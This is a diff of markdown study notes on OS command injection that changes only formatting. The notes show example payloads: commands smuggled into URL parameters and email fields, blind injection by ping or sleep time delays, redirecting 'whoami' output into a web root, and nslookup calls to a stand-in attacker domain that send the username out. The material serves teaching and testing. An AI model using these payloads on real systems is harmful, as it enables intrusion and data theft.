@@ -4,15 +4,15 @@ OS command injection (also known as shell injection) is a web security vulnerabi
 
 ## Execute Arbitrary commands :
 
-`**https://insecure-website.com/stockStatus?productID=381&storeID=29**`
+`https://insecure-website.com/stockStatus?productID=381&storeID=29`
 
 consider given link there may be legacy system running script behind may be it run script with parameters ...
 
 ie : python3 stockCheck.py 381 29
 
-then this script gives output based on params. now assume we give additional input `**& echo "abc"**` , application may also print **abc** as application output. so input should look like...
+then this script gives output based on params. now assume we give additional input `& echo "abc"` , application may also print **abc** as application output. so input should look like...
 
-`**https://insecure-website.com/stockStatus?productID=381%20&%20echo%20"abc"%20&storeID=29**` that will execute python3 [stockCheck.py](http://stockCheck.py) 381 & echo "abc" & 29
+`https://insecure-website.com/stockStatus?productID=381%20&%20echo%20"abc"%20&storeID=29` that will execute python3 [stockCheck.py](http://stockCheck.py) 381 & echo "abc" & 29
 
 Output from legacy system would look like...
 
@@ -40,17 +40,17 @@ Many instances of OS command injection are blind vulnerabilities. This means tha
 
 in feedback like functionality, site may ask for email address to supply it to admin
 
-`**mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com**`
+`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`
 
-so use something different payload like email address like `**peter@normal-user.net & echo "abc" &**` 
+so use something different payload like email address like `peter@normal-user.net & echo "abc" &` 
 
 or we can add command in comment section too.
 
 ## Blind OS command Injection using time delays :
 
-sometime normal output is not shown to user, so try to trigger time delays using commands like `**ping -c 10**` or `**sleep**, etc`
+sometime normal output is not shown to user, so try to trigger time delays using commands like `ping -c 10` or `sleep, etc`
 
-`**& ping -c 10 127.0.0.1 &**`
+`& ping -c 10 127.0.0.1 &`
 
 This command will cause the application to ping its loopback network adapter for 10 seconds.
 
@@ -61,15 +61,15 @@ You can redirect the output from the injected command into a
  For example, if the application serves static resources from the 
 filesystem location `**/var/www/static**`, then you can submit the following input:
 
-`**& whoami > /var/www/static/whoami.txt &**`
+`& whoami > /var/www/static/whoami.txt &`
 
-we can retrieve output at `**https://vulnerable-website.com/whoami.txt**` 
+we can retrieve output at `https://vulnerable-website.com/whoami.txt` 
 
 ### Or we can use OAST techniques to interact with collaborator or exfiltrate data
 
-`**& nslookup kgji2ohoyw.web-attacker.com &` - interact**
+`& nslookup kgji2ohoyw.web-attacker.com &` - **interact**
 
-`**& nslookup `whoami`.kgji2ohoyw.web-attacker.com &` - exfiltrate username**
+`& nslookup `whoami`.kgji2ohoyw.web-attacker.com &` - **exfiltrate username**
 
 ## Ways to inject OS Commands :
 
